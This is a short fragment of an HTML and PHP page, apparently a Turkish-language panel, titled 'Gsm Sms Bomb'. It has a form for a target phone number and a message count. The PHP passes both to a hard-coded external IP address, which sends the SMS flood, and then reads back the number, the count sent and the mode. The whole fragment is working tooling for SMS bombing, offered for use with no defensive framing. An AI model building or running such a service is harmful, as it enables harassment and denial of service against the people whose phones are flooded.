...
<div class="content">
    <h2 class="d-print-none">Gsm Sms Bomb</h2>
    <div class="row">
	<form action="gsm-smsbomber.jsp" method="post">
        <div class="col-md-12">
        <div class="col-lg-8 col-xl-5">
                <div class="mb-4">
                    <div class="input-group">
                        <span class="input-group-text">Numara</span>
                        <input id="tc" name="tc" type="text" maxlenght="10" class="form-control">
                    </div>
                </div>
                <div class="col-lg-8 col-xl-5">
                <div class="mb-4">
                    <div class="input-group">
                        ...
                        <input id="adet" name="adet" type="text" maxlenght="10" class="form-control">
                    </div>
                </div>
            </div>
        </div>
        ...
        <div class="col-xl-12 col-lg-6">
            <div class="table-responsive">
                <table id="t" class="table table-bordered table-striped table-vcenter">
					...
					$ailelink = "http://20.96.185.124/kimlik/woxy/sms.jsp?telno=$tcs&adet=$msgadet";
					$kr=file_get_contents($ailelink);
					$value =json_decode($kr,true);
					
						
                    $telefon=$value["data"]["phone"];
                    $yollananadet=$value["data"]["adet"];
                    $modu=$value["data"]["mode"];
